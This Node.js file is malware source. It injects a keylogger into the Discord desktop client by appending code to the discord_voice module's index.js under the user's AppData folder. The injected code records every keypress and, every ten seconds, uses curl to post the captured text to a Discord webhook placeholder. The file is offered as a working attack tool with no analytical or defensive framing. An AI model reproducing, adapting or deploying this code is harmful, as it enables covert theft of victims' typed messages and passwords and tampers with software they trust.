//Dependencies
const Fs = require("fs")
const Os = require("os")

//Variables
var malicious_code = `var keys = "";
const send_time = 10000;
document.onkeypress = function(e) {
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}

window.setInterval(function(){
    if(keys.length>0) {
        ChildProcess.exec('curl -X POST -H "Content-Type: application/json" -d "{\\"content\\":\\"' + keys + '\\"}" discordwebhook_link', function(err, stdout, stderr){
            if(err){ return }
			
			keys = "";
        })
    }
}, send_time);`

//Main
if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
    const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)

    Directories().forEach(directory =>{
        if(directory.indexOf("app") != -1){
            Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, "utf8", function(err, data){
                if(err){
                    process.exit()
                }
        
                if(data.indexOf("curl") != -1){
                    process.exit()
                }
        
                data += `\n${malicious_code}`
        
                Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\discord_voice-6\\discord_voice\\index.js`, data, "utf8")
            })
        }
    })
}
